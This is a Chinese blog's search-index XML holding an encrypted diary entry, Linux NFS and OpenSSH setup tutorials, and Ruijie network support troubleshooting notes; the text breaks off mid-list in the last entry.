<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实习记</title>
      <link href="/posts/30295"/>
      <url>/posts/30295</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e1fd513b41ad34b0bfcc2598c2c7a8a86aae9af7242206ed7e6f50f7f9fd8504">664ba3f4b3af89796dc9dc4f1b982454120854af7b9001c5dedf9ae4f4dd590ed8a91def41b2bda0bd4c9940758c933f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这里需要密码才能访问。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之NFS服务</title>
      <link href="/posts/53149"/>
      <url>/posts/53149</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>VMware Workstation 14</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Server：Kali-linux-2023.1（IP：192.168.20.101） </p><p>Client：Centos-Stream-9-latest（IP：192.168.20.102）</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><h2 id="NFS简介"><a href="#NFS简介" class="headerlink" title="NFS简介"></a>NFS简介</h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p><p>以下是NFS最显而易见的好处：</p><ul><li>节省本地存储空间，将常用的数据存放在一台NFS服务器上且可以通过网络访问，那么本地终端将可以减少自身存储空间的使用。</li><li>用户不需要在网络中的每个机器上都建有Home目录，Home目录可以放在NFS服务器上且可以在网络上被访问使用。</li><li>一些存储设备如软驱、CDROM和Zip（一种高储存密度的磁盘驱动器与磁盘）等都可以在网络上被别的机器使用。这可以减少整个网络上可移动介质设备的数量。</li></ul><p>需要特别强调，NFS服务用于Linux类的主机间的文件共享，当需要与windows生态进行访问时，需要采用SMB协议。</p><h2 id="服务搭建"><a href="#服务搭建" class="headerlink" title="服务搭建"></a>服务搭建</h2><p>在NFS的服务中，主要依赖于nfs-utils与rpcbind的来进行服务。</p><p><strong>I</strong>.在centos中，使用如下命令安装所需服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Server ~]# yum install rpcbind nfs-utils -y</span><br></pre></td></tr></table></figure><p><strong>II</strong>.启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start rpcbind</span><br><span class="line">systemctl start nfs-server</span><br><span class="line">systemctl enable rpcbind</span><br><span class="line">systemctl enable nfs-server</span><br></pre></td></tr></table></figure><p>查看rpc服务的注册情况，可使用rpcinfo的指令进行查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p localhost</span><br></pre></td></tr></table></figure><p><strong>III</strong>.NFS配置文件</p><p><strong>01</strong>.配置目录为&#x2F;etc&#x2F;exports，根据需要建立分享文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /share1</span><br><span class="line">mkdir /share2</span><br></pre></td></tr></table></figure><p><strong>02</strong>.编辑&#x2F;etc&#x2F;exports，输入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/share1 *(sync,ro) 10.10.20.101(sync,rw)</span><br><span class="line">/share2 10.10.20.0/24(sync,ro)</span><br></pre></td></tr></table></figure><p><img src="/images/Linux%E4%B9%8BNFS%E6%9C%8D%E5%8A%A1/01.jpg"></p><p>编辑完成后，需要运行exportfs重新发布所共享的目录。（exportfs -r 重新读取配置文件）</p><p><img src="/images/Linux%E4%B9%8BNFS%E6%9C%8D%E5%8A%A1/02.jpg"></p><p>如果需要重启服务，建议先重启rpcbind再重启NFS服务。</p><p>配置文件含义如下：</p><p>输出”&#x2F;share1”目录，对所有主机可读，对IP地址为10.10.20.101的主机可读可写。</p><p>输出”&#x2F;share2”目录，对10.10.0.0&#x2F;24网络内的所有主机可读。</p><p>配置文件每行分为两段：第一段为共享的目录，使用绝对路径，第二段为客户端地址及权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">地址可以使用完整IP或网段，例如10.0.0.8或10.0.0.0/24，10.0.0.0/255.255.255.0当然也可以地址可以使用主机名，DNS解析的和本地/etc/hosts解析的都行，支持通配符，例如：*.fsec.io  </span><br><span class="line"> 权限有：  </span><br><span class="line">·  rw：read-write，可读写； </span><br><span class="line">·  ro：read-only，只读；  </span><br><span class="line">·  sync：文件同时写入硬盘和内存；  </span><br><span class="line">·  async：文件暂存于内存，而不是直接写入内存；  </span><br><span class="line">·  no_root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，也拥有root权限。  </span><br><span class="line">·  root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，拥有匿名用户权限，通常他将使用nobody或nfsnobody身份；  </span><br><span class="line">·  all_squash：不论NFS客户端连接服务端时使用什么用户，对服务端分享的目录来说都是拥有匿名用户权限；  </span><br><span class="line">·  anonuid：匿名用户的UID值，通常是nobody或nfsnobody，可以在此处自行设定；  </span><br><span class="line">·  anongid：匿名用户的GID值。</span><br></pre></td></tr></table></figure><p><strong>IV</strong>.客户端访问</p><p><strong>01</strong>.showmount命令：</p><p>showmount -e显示本地NFS服务器中的共享列表</p><p>showmount -e IP 显示指定NFS服务器中的共享列表</p><p><strong>02</strong>.mount命令：</p><p>mount命令用于挂载磁盘，在nfs的服务中，需要使用mount -t nfs 或者mount.nfs的指令进行指定挂载的类型。</p><p>使用挂载前先在客户端创建挂载点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/share1 /mnt/share2</span><br></pre></td></tr></table></figure><p>随后使用mount指令将远程主机的目录挂载至本机的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 10.10.20.101:/share1 /mnt/share1</span><br><span class="line">mount.nfs 10.10.20.101:/share2 /mnt/share2</span><br></pre></td></tr></table></figure><p><img src="/images/Linux%E4%B9%8BNFS%E6%9C%8D%E5%8A%A1/03.jpg"></p><p>当我们进入到挂载好的目录中，分别进行创建文件的测试，会发现虽然同时失败，但报错的信息却分别为<strong>权限不够</strong>与<strong>只读文件系统</strong>。</p><p>但我们所配置的权限中，特定的IP已经给予rw的权限，却提示权限不够。换言之，share2的权限是对的，share1的写入权限为错误状态。</p><p><img src="/images/Linux%E4%B9%8BNFS%E6%9C%8D%E5%8A%A1/04.jpg"></p><p>exports目录权限中，有这么一个参数<strong>no_root_squash</strong>。</p><p>其作用是：登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有root 的权限！。默认情况使用的是相反参数root_squash：在登入 NFS 主机使用分享之目录的使用者如果是 root 时，那么这个使用者的权限将被压缩成为匿名使用者，通常他的UID 与 GID 都会变成 nobody 那个身份。</p><p>为此重新修正权限后即可完成写入。</p><p><img src="/images/Linux%E4%B9%8BNFS%E6%9C%8D%E5%8A%A1/05.jpg"></p><p><strong>V</strong>.卸载已挂载的目录</p><p>mount |grep nfs显示当前主机挂载的NFS共享目录</p><p>umount 命令卸载NFS 文件系统(不要在挂载的目录中进行操作)</p><h2 id="哪些文件需要备份"><a href="#哪些文件需要备份" class="headerlink" title="哪些文件需要备份"></a>哪些文件需要备份</h2><p>数据无价！！！</p><p>数据库、web代码、web所上传的文件、日志等。</p><h2 id="错误的NFS配置"><a href="#错误的NFS配置" class="headerlink" title="错误的NFS配置"></a>错误的NFS配置</h2><p>第一，如果NFS暴露在公网中，虽然只给予了只读权限，那么外网主机通过访问共享即可得到敏感的数据。</p><p>第二，NFS在位于内网中的情况，那么当攻击者拿到其中一台主机的权限后，可通过访问备份的目录进入到数据集中的区域。</p><p>第三，如果将敏感的目录共享出去，攻击者有可能查看到&#x2F;etc&#x2F;shadow或者编辑密钥实现攻击。</p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之Openssh服务</title>
      <link href="/posts/52881"/>
      <url>/posts/52881</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>VMware Workstation 14</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Server：</p><p>——Kali-linux-2023.1（IP：192.168.20.101） </p><p>Client：</p><p>——Centos-Stream-9-latest（IP：192.168.20.102）</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><h2 id="什么是SSH"><a href="#什么是SSH" class="headerlink" title="什么是SSH"></a><strong>什么是</strong>SSH</h2><p><font face="微软雅黑"><code>SSH</code> 为 Secure Shell 的缩写，是建立在应用层基础上的安全协议。SSH是较为可靠的专为远程登录会话和其他网络服务提供安全性的协议。利用用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</font></p><p>OpenSSH 服务是 SSH 协议的免费开源实现，可以用来进行远程控制， 或在计算机之间传送文件。而实现此功能的传统方式，如telnet(终端仿真协议)、 rdp ftp、 rlogin、rsh都是极为不安全的，并且会使用明文传送密码。OpenSSH提供了服务端后台程序和客户端工具，用来加密远程控制和文件传输过程中的数据，并由此来代替原来的类似服务。</p><p>通过使用SSH，你可以把所有传输的数据进行加密，这样可以较好地抑制”中间人”这种攻击，也可能够防御DNS欺骗和IP欺骗。</p><p>使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。</p><p>在前文中，我们已经介绍了使用<code>ssh</code>命令远程连接服务器的方法。接下来我们将介绍使用其传输文件的命令。</p><h3 id="scp命令"><a href="#scp命令" class="headerlink" title="scp命令"></a>scp命令</h3><p><strong>I</strong>.将本机文件复制到远程服务器上（上传）</p><p>命令格式：<code>scp 【本地文件路径】 [username]@[主机IP]：[拷贝的目录]</code></p><p><img src="/images/Linux%E4%B9%8BOpenssh%E6%9C%8D%E5%8A%A1/01.jpg"></p><p><strong>II</strong>.将远程服务器上的文件复制到本机（下载）</p><p>命令格式：<code>scp [username]@[主机地址]:[服务器上文件路径] [本地文件路径]</code></p><p><img src="/images/Linux%E4%B9%8BOpenssh%E6%9C%8D%E5%8A%A1/02.jpg"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong>I</strong>.默认openssh已经安装与CentOS中，无须额外安装。</p><p><img src="/images/Linux%E4%B9%8BOpenssh%E6%9C%8D%E5%8A%A1/03.jpg"></p><p><strong>II</strong>.查看服务状态。</p><p>可使用<code>systemctl</code>命令查看和设置openssh服务的状态。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl status sshd.service    <span class="comment">#查看ssh状态</span></span><br><span class="line">systemctl start sshd.service     <span class="comment">#启动ssh服务</span></span><br><span class="line">systemctl stop sshd.service      <span class="comment">#停止ssh服务</span></span><br></pre></td></tr></table></figure><p>注意：<strong>如果服务关闭，则无法远程登录服务器。</strong></p><p><strong>III</strong>.配置免密码（公私钥认证）登录</p><p><code>ssh</code>服务主要有两种登录方式：第一种为密码口令登录，第二种为公钥登录。</p><p>下面我们来解释一下公私钥的概念：</p><p>密码体系从加密和解密方面来分类的话，可以分为对称加密和非对称加密。</p><ul><li>对称加密：加密和解密使用的密钥是同一个。</li><li>非对称加密：加密和解密使用的密钥是不同的，采用两个密钥。</li><li>对称加密解密的速度比较快，非对称加密和解密花费的时间长、速度相对较慢。</li><li>对称加密的安全性相对较低，非对称加密的安全性较高。</li></ul><p>公私钥体系既是常见的非对称加密，每个通信方均需要两个密钥，即公钥和私钥，这两把密钥可以互为加解密。公钥是公开的，不需要保密，而私钥是由个人自己持有，并且必须妥善保管和注意保密。其特性为：</p><ul><li>一个公钥对应一个私钥。</li><li>密钥对中，让大家都知道的是公钥，不告诉大家，只有自己知道的，是私钥。</li><li>如果用其中一个密钥加密数据，则只有对应的那个密钥才可以解密。</li><li>如果用其中一个密钥可以进行解密数据，则该数据必然是对应的那个密钥进行的加密。</li></ul><p>ssh服务通过密码进行登录，主要流程为：</p><ol><li>客户端连接上服务器之后，服务器把自己的公钥传给客户端</li><li>客户端输入服务器密码通过公钥加密之后传给服务器</li><li>服务器根据自己的私钥解密登录密码，如果正确那么就让客户端登录</li></ol><p>ssh服务公钥登录，主要流程为：</p><ol><li>客户端生成RSA公钥和私钥</li><li>客户端将自己的公钥存放到服务器</li><li>客户端请求连接服务器，服务器将一个随机字符串发送给客户端</li><li>客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</li><li>服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</li></ol><br /><p>使用公私钥登录，可以避免每次登录服务器都输入密码。下面我们来实际操作此流程。</p><p>linux下可以用用<code>ssh-keygen</code>命令生成公钥&#x2F;私钥对。</p><p>若有机器A，B。现想A（服务端）通过ssh免密码登录到B（客户端）。 在A机（服务端）下使用<code>ssh-keygen</code>命令生成公钥&#x2F;私钥对。在执行此命令后将在<code>/root/.ssh</code>目录下将生成<code>id_rsa</code>和<code>id_rsa.pub</code>文件。</p><p><img src="/images/Linux%E4%B9%8BOpenssh%E6%9C%8D%E5%8A%A1/04.jpg"></p><p>进入<code>/root/.ssh</code>文件夹可以看到如下密钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id_rsa        <span class="comment">#私钥</span></span><br><span class="line">id_rsa.pub    <span class="comment">#公钥</span></span><br></pre></td></tr></table></figure><p>在B机器（客户端）开启证书的验证，默认是开启的。 若没有开启可修改ssh配置文件，<code>vi /etc/ssh/sshd_config</code>，将文本中有关<code>PubkeyAuthentication</code>和<code>AuthorizedKeysFile</code>的条目修改为如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>随后重启服务 <code>systemctl restart sshd.service</code></p><p>A机器（服务端）使用<code>ssh-copy-id [user]@[host]</code>命令拷贝密钥文件到B机器（客户端），随后使用服务端去访问客户端。</p><p><img src="/images/Linux%E4%B9%8BOpenssh%E6%9C%8D%E5%8A%A1/05.jpg"></p><p>而如果我们此时使用另外一台主机登录，我们会发现可以通过密码的方式登录。我们可以修改配置文件<code>/etc/ssh/sshd_config</code>中的第70行<code>PasswordAuthentication</code> 值为<code>no</code>，可以禁止使用密码的方式。</p><br /><br /><blockquote><p>转载于<a href="http://www.farmsec.com/">农夫安全</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>睿易培训</title>
      <link href="/posts/34645"/>
      <url>/posts/34645</url>
      
        <content type="html"><![CDATA[<br /><br /><p style="text-align:center;color:red;font-size:1.5em;font-weight: bold;">锐捷睿易网络售后工程师培训笔记<p><img src="/images/%E9%94%90%E6%8D%B7%E5%9F%B9%E8%AE%AD/01.jpg"></p><h2 id="客户问题解决"><a href="#客户问题解决" class="headerlink" title="客户问题解决"></a>客户问题解决</h2><h3 id="互ping不通"><a href="#互ping不通" class="headerlink" title="互ping不通"></a>互ping不通</h3><h4 id="同网段互ping不通"><a href="#同网段互ping不通" class="headerlink" title="同网段互ping不通"></a>同网段互ping不通</h4><p>①检查互ping设备是否开启防火墙，如果开启防火墙需要关闭（电脑防火墙有防ping功能）。</p><p>②检查IP地址子网掩码是否填写正确。</p><p>③检查物理线路是否正常</p><p>④检查是否有环路、小路由、地址冲突   。换一根网线</p><p>⑤简化环境（拔掉多余设备进行测试）</p><p>⑥交换机是否开启端口隔离功能</p><p>⑦如果是两台设备直连路由器需要查看路由器是否开启mac地址过滤或访问控制功能。</p><p>⑧交换机如果是可网管交换机查看交换机VLAN划分是否正确。</p><h4 id="不同网段互ping不通"><a href="#不同网段互ping不通" class="headerlink" title="不同网段互ping不通"></a>不同网段互ping不通</h4><p>①检查互ping设备是否开启防火墙，如果开启防火墙需要关闭（电脑防火墙有防ping功能）。</p><p>②检查IP地址子网掩码是否填写正确。</p><p>③检查物理线路是否正常</p><p>④检查是否有环路、小路由、地址冲突</p><p>⑤简化环境（拔掉多余设备进行测试）</p><p>⑥路由器是否开启访问控制功能。</p><h3 id="无法上网"><a href="#无法上网" class="headerlink" title="无法上网"></a>无法上网</h3><p><strong>路由器可以上网下联设备无法上网，先确认路由器是否可以上网</strong></p><h4 id="设备无法获取地址"><a href="#设备无法获取地址" class="headerlink" title="设备无法获取地址"></a>设备无法获取地址</h4><p>①检查设备物理线路是否正常，网线等</p><p>②电脑配置默认网段静态地址查看是否可以上网，如果可以上网说明，路由器没有开启dhcp功能或交换机开启了DHCP snooping 功能选错信任端口。</p><p>③如果电脑配置静态连接交换机无法上网，则电脑直连路由器lan0口查看是否可以上网，如果可以，说明交换机VLAN划分有问题或交换机线路不通。</p><p>④简化环境，保证无环路、小路由等。</p><p>⑤检查是否超出路由器带机量</p><h4 id="设备有地址（或者获取地址不正确）"><a href="#设备有地址（或者获取地址不正确）" class="headerlink" title="设备有地址（或者获取地址不正确）"></a>设备有地址（或者获取地址不正确）</h4><p>①检查设备地址是否为自动获取，如是静态地址改为动态获取查看是否上网或检查地址配置是否正确。</p><p>②如设备是自动获取，但是获取的地址不是主路由器下发的地址则为小路由情况（可以输入设备获取的网关地址进入设备管理界来确定是什么设备下发的错误地址）。</p><p>③小路由解决方法：交换机开启DHCP snooping功能选择连接路由器的接口为信任端口   关闭小路由的DHCP功能  用小路由的wan口连接上联设备。</p><p>例如：路由器是华为，交换机是锐捷，现在连接交换机无法上网。这种情况下只能使用简化环境（小路由，环路。只留一台测试用的设备）。下联有其他设备导致环路或者有小路由有问题，导致无法上网。</p><h4 id="设备有地址（获取地址正确）"><a href="#设备有地址（获取地址正确）" class="headerlink" title="设备有地址（获取地址正确）"></a>设备有地址（获取地址正确）</h4><p>①检查路由器是否开启访问控制，应用控制，网站过滤，流控设置流量设置过低，mac过滤，arp防护、认证设置或pppoe服务器。</p><p>②替换终端设备进行测试</p><p>③检查是否超出路由器带机量</p><p>④升级路由器版本</p><p>⑤重置路由器</p><h3 id="上网配置不成功"><a href="#上网配置不成功" class="headerlink" title="上网配置不成功"></a>上网配置不成功</h3><p><strong>路由器无法上网</strong></p><h4 id="拨号上网不成功："><a href="#拨号上网不成功：" class="headerlink" title="拨号上网不成功："></a>拨号上网不成功：</h4><p>①确认拨号账号密码是否正确</p><p>②检查路由器与光猫之间网线的连通性</p><p>③检查是否有其他设备已使用该账号密码进行上网，如果有需要将其他设备拔掉路由器重新拨号（一个账号不能同时有两台设备使用）</p><p>④用电脑直连光猫进行测试查看是否可以拨号成功，如果不可以则让客户联系运营商，如果可以则做mac 克隆（把电脑的mac地址复制到路由器wan设置—高级设置mac地址里面，替换之前的mac地址，要注意路由器里面的mac地址是由英文的冒号隔开的）。</p><p>⑤更改路由器mtu值（wan设置—高级设置）这个值要大于1200小于1500，最好用1300、1400、1450这种整数。</p><p>⑥查看路由器版本是否过低，如果过低则升级版本</p><p>⑦重置路由器重新拨号</p><h4 id="静态上网"><a href="#静态上网" class="headerlink" title="静态上网"></a>静态上网</h4><p>①   确认IP地址是否正确</p><p>②   检查路由器与光猫之间网线的连通性</p><p>③   检查是否有其他设备已使用该ip，如果有需要将其他设备线拔掉或者重新获取地址</p><p>④用电脑直连光猫进行测试查看是否可以拨号成功，如果不可以让客户联系运营商，如果可以则做mac 克隆（把电脑的mac地址复制到路由器wan设置—高级设置mac地址里面，替换之前的mac地址，要注意路由器里面的mac地址是由英文的冒号隔开的）。</p><p>⑤更改路由器mtu值（wan设置—高级设置）这个值要大于1200小于1500，最好用1300、1400、1450这种整数。</p><p>⑥查看路由器版本是否过低，如果过低则升级版本</p><p>⑦重置路由器重新拨号</p><h4 id="动态上网："><a href="#动态上网：" class="headerlink" title="动态上网："></a>动态上网：</h4><p>①   检查路由器与光猫之间网线的连通性</p><p>②   用电脑直连光猫进行测试查看是否可以拨号成功，如果不可以让客户联系运营商，如果可以则做mac 克隆（把电脑的mac地址复制到路由器wan设置—高级设置mac地址里面，替换之前的mac地址，要注意路由器里面的mac地址是由英文的冒号隔开的）。</p><p>③   更改路由器mtu值（wan设置—高级设置）这个值要大于1200小于1500，最好用1300、1400、1450这种整数。</p><p>④   查看路由器版本是否过低，如果过低则升级版本</p><p>⑤   重置路由器重新拨号</p><p>注：上网方式由光猫决定，如果光猫是桥模式（相当于一根线）则路由器需要拨号上网，如果光猫是路由模式则路由器需要动态上网或静态上网。</p><h3 id="设备管理界面打不开"><a href="#设备管理界面打不开" class="headerlink" title="设备管理界面打不开"></a>设备管理界面打不开</h3><p>①   检查登录地址是否输入正确</p><p>②   更换登录地址测试（主界面10.44.77.253）（辅界面10.44.77.254）终端设备获取的网关地址。</p><p>③   如输入网关地址进入的管理界面不是主路由则检查是否有小路由情况。</p><p>④更换浏览器最好是谷歌、360安全浏览器。（如果进界面一直显示三个小齿轮一直转大概率就是浏览器问题）</p><p>⑤简化环境只保留主设备和终端进行测试</p><p>⑥   如果有绑定macc则macc穿透管理界面查看是否设备版本过低导致</p><p>⑦   重启设备—–重置设备</p><p>⑧   设备重设之后密码要求                               </p><h3 id="无线密码忘记"><a href="#无线密码忘记" class="headerlink" title="无线密码忘记"></a>无线密码忘记</h3><p>是否增加过睿易app（诺克云），添加过在app修改</p><p>物理恢复，让客户界面是否是蓝色的，蓝色的可自动备份，绿色不能只能重新配置。</p><h3 id="网桥卡"><a href="#网桥卡" class="headerlink" title="网桥卡"></a>网桥卡</h3><p>例如客户问网桥卡，摄像头一会有，一会就没有</p><p>先问环境是否有问题？先问是否有干扰，是否是高延迟，再问附近是否有信号塔电磁波强电强压之类的设备，网桥之间是否有遮挡，比如说有高压线，角度对不对。</p><p>之后进入管理界面调频宽信道发射功率，如果说还不行。问网络环境中有多少网桥。例如100对网桥，跟客户说线都拔了最后只剩一对，这边网桥接电脑，那边接摄像头，互ping看延迟。看有没有干扰，如果成功，说明网络中有广播风暴等。</p><h2 id="VPN-IPSEC-建立不成功"><a href="#VPN-IPSEC-建立不成功" class="headerlink" title="VPN(IPSEC)建立不成功"></a>VPN(IPSEC)建立不成功</h2><p>①检查服务端是否为公网地址（用自己的电脑去ping测试人如果可以通则说明是公网地址，一定要用自己的电脑ping不是客户的电脑）</p><p>②  检查服务端本地子网范围是否真实存在于lan口</p><p>③  客户端对端网关是否为服务端的公网地址，本地子网范围是否真实存在于lan口，对端子网范围是否为服务端的本地子网范围，本地子网范围与对端子网范围是否冲突，两端秘钥是否一致。 </p><p>wan口lan口不能同网段。首先需要检查wan口地址，不能和新建立的LAN冲突，否则会在建立lan地址上+1</p><p>④两端设备是否有开启端口映射或全映射占用4500&#x2F;500两个端口，如果占用则关闭端口映射进行测试（Ipsec vpn建立需要通过4500&#x2F;500两个端口号进行连接）</p><p>⑤删除vpn策略重新建立</p><p>⑥重启设备</p><p>⑦检查客户端是否为一级路由，如果是二级路由需要确认上联设备有没有限制，也可以改为一级路由进行测试</p><p>⑧升级路由器版本</p><p>注：1.服务端为二级路由也能做vpn，需要一级路由配合使用。</p><p>  2.如果是拨号上网的上网方式获取的地址是100.x.x.x一般都不是公网地址</p><p>客户问为什么不是公网？ 100.x.x.x是私网地址，是运营商建立的一个内网地址，非公网。这时需要您去联系运营商获取一下自己的公网地址。</p><h3 id="端口映射不成功"><a href="#端口映射不成功" class="headerlink" title="端口映射不成功"></a>端口映射不成功</h3><p>①   确认是否为公网地址。（在路由器——故障诊断中ping目的地址）</p><p>②   确认内部服务器是否可以正常上网，如果无法上网则先按照上不了网排查，保证 服务器可以上网。</p><p>③   用于服务器同一局域网的设备去telnet 内部服务器ip 内部端口号进行测试如果不通则需要客户确认服务器端口号放通情况，如果可以通进行下一步。</p><p>④避免网络中出现环路或者小路由情况</p><p>⑤更改外部端口号进行测试。</p><p>⑥检查服务器是否为多网卡，进来保证服务器只保留一个网卡</p><p>⑦升级路由器版本，重启下联服务器</p><p>⑧telnet 外部服务器ip 外部端口号只要测试成功可以，如果网页无法访问该服务器则需要找相应服务器原因。</p><p>注：路由器管理界面无法被映射</p><h3 id="有线卡、有线测速上不去"><a href="#有线卡、有线测速上不去" class="headerlink" title="有线卡、有线测速上不去"></a>有线卡、有线测速上不去</h3><p>①检查设备是否开启流控</p><p>②查看网口协商速率是否为千兆如果不是千兆则先检查设备型号是否支持千兆，如果都有支持千兆但是协商百兆或十兆则检查网线（如果电脑连接交换机或路由器关机后网线也会显示十兆属于正常现象）</p><p>④   检查是否超出设备带机量（设备下连接多少终端）</p><p>⑤   更改dns</p><p>⑥   更改mtu值  最低  1200  1300 1400</p><p>⑦   确认外网带宽（如果带宽过低下联设备过多也会导致卡顿或测速慢）</p><p>⑧   检查是否有环路或小路由（傻瓜交换机，没有环路小路由）</p><p>⑨   简化环境测</p><p>⑩   更换测速网络节点测试</p><p>⑨直连光猫测速（如果直连光猫不正常找运营商）</p><p>⑩检查会话数是否过高（一般会话数在1800以下），p86版本之前只能在macc查看，左侧网络—业务–更多—数据洞察，新版本可以在设备概览—历史流量查看。</p><p>11   升级路由器版本—重置设备</p><p>12   开外网卡不卡。摄像头限制流控。</p><p>13   ping192.168.1.1 1ms 延迟说明上联设备有问题</p><h3 id="无线卡、无线测速上不去"><a href="#无线卡、无线测速上不去" class="headerlink" title="无线卡、无线测速上不去"></a>无线卡、无线测速上不去</h3><p>①   首先检查设备有线是否正常，如果不正常则按照有线卡排查</p><p>②   检查是否有智能流控—自定义策略</p><p>③   检查是否有超出ap带机量或者ap单个频段带机量，请问一下您ap下有多少连接终端用户</p><p>④   确认部署环境，有没有隔墙部署（走廊部署）或者部署过密（一般一个房间一个空旷环境下十几米一个ap为正常），如果部署过密可以减小设备功率进行测试。</p><p>⑤   是否有多个低速率终端（无线协商速度小于十兆的设备定义为低速率终端）如果有则先把低速率终端踢出。</p><p>⑥   无线用户是否与摄像头在用一网段，如果有最好把无线用户与摄像头的网段分开（一般改无线用户的网段摄像头一般是静态地址不方便更改），摄像头与无线用户在同网段也有可能导致信道拥堵。</p><p>⑦   用户与设备之间的距离。</p><p>⑧   检查无线设置高级设置里面是否有不支持的功能开启，如果有把不支持的关闭测试。</p><p>⑨   检查无线信道是否有阻塞或繁忙情况，如果有则更改设备信道改小频宽（通过无线魔盒测试后进行调整，最好不要设备调整）</p><p>⑩   升级ap版本，重启设备，重置设备。</p><p>注：无线测速为半双工个的工作模式，测试要基于设备的无线协商速率，在外网带宽足够的正常的情况下一般测速为无线协商速率的一半左右。比如无线协商速率866m测速大概400左右。</p><p>注：无线魔盒测试参考下图，尽量调整到干扰小的信道上或者最优信道上，苹果手机没有看干扰和信道分析功能，只能是安卓手机。</p><h3 id="专线配置不成功"><a href="#专线配置不成功" class="headerlink" title="专线配置不成功"></a>专线配置不成功</h3><p>①相应wan口地址配置是否正确（可以在路由器上ping一下相应的wan口的网关地址，如果通说明路由器与相应光猫的通信没有问题，如果不通则可能是网关地址错误或者线路不通）。</p><p>④   专线按钮是否开启，运营商负载设置是否为主备。</p><p>⑤   静态路由填写是否正确。</p><p>如果不知道目的地址给他扩大范围：172.0.0.0&#x2F;8  10.0.0.0&#x2F;8  59.0.0.0&#x2F;8  </p><p>④静态路由地址是否覆盖完全。</p><p>⑤是否有写策略路由影响设备选路。</p><p>⑥   电脑直连光猫测速，如果不行联系运营商。</p><p>⑦   如果电脑直连光猫可以则mac克隆，修改mtu。</p><p>⑧升级路由器版本。</p><h3 id="网页打不开-x2F-打开慢"><a href="#网页打不开-x2F-打开慢" class="headerlink" title="网页打不开&#x2F;打开慢"></a>网页打不开&#x2F;打开慢</h3><p>①  是否开启网站过滤&#x2F;访问控制。</p><p>②  更换终端设备的dns。</p><p>③  确认是否是有线无线打开都慢，如果有线正常无线会出现问题则按照无线卡排查。</p><p>④  